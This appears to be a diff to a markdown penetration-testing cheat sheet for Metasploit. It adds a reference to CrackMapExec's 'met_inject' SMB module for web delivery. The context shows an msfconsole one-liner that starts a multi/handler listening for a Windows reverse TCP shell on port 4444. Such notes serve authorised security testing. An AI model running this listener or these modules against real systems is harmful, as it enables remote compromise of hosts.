@@ -46,6 +46,9 @@ Or linux one-liner
 msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $interface; set LPORT 4444;exploit"
 ```
 
+Web Delivery [[Crackmapexec-Cheatsheet]] smb Module `met_inject`
+
+
 ## Commands
 
 ```msfconsole
